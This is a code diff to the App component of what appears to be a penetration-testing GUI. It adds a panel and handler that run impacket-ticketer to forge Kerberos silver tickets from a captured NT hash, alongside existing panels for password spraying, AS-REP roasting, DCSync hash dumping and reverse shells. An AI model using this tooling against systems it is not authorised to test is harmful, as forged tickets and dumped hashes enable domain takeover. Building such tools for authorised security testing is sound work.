@@ -15,6 +15,7 @@ import KerbruteEnumPanel from "./KerbruteEnumPanel";
 import AsrepRoastPanel from "./AsrepRoastPanel";
 import PasswordSprayPanel from "./PasswordSprayPanel";
 import DomainDominancePanel from "./DomainDominancePanel";
+import SilverTicketPanel from "./SilverTicketPanel";
 import CiscoType7Decoder from "./CiscoType7Decoder";
 import GppCpasswordDecoder from "./GppCpasswordDecoder";
 import ReverseShellPanel from "./ReverseShellPanel";
@@ -733,6 +734,24 @@ export default function App() {
       },
     });
   };
+  const runSilverTicketForge = (fields: {
+    nthash: string; domain: string; domainSid: string;
+    spn: string; groups: string; targetUsername: string;
+  }) => {
+    if (!target) return;
+    setRunWithSudo(false);
+    void run({
+      id: "ad-silver-ticket-ticketer",
+      preview: `impacket-ticketer -nthash *** -domain-sid ${fields.domainSid}` +
+        ` -domain ${fields.domain} -spn ${fields.spn} -groups ${fields.groups}` +
+        ` ${fields.targetUsername}`,
+      target_level: true,
+      variables: {
+        nthash: fields.nthash, domain_sid: fields.domainSid, domain: fields.domain,
+        spn: fields.spn, groups: fields.groups, target_username: fields.targetUsername,
+      },
+    });
+  };
   const saveDcsyncHash = async (dumpedUsername: string, nthash: string) => {
     if (!projectId || !targetId) return;
     setSaveHashMsg("");
@@ -1136,6 +1155,14 @@ export default function App() {
               onFillCredential={(u, h) => { credStore.setUsername(u); credStore.setPassword(h); }}
               onSaveHash={(u, h) => void saveDcsyncHash(u, h)}
               saveHashMsg={saveHashMsg} />
+          )}
+          {["ldap", "ldaps"].includes(serviceNameLower) && (
+            <SilverTicketPanel target={target}
+              runState={runStates["ad-silver-ticket-ticketer"]}
+              serviceExecutions={serviceExecutions} evidenceMsg={evidenceMsg}
+              dcsyncStdout={runStates["ad-dcsync-secretsdump"]?.stdout}
+              onForge={runSilverTicketForge}
+              onCaptureEvidence={(execution, title) => void captureEvidence(execution, title)} />
           )}
           {["microsoft-ds", "netbios-ssn", "smb"].includes(serviceNameLower) && (
             <CiscoType7Decoder />
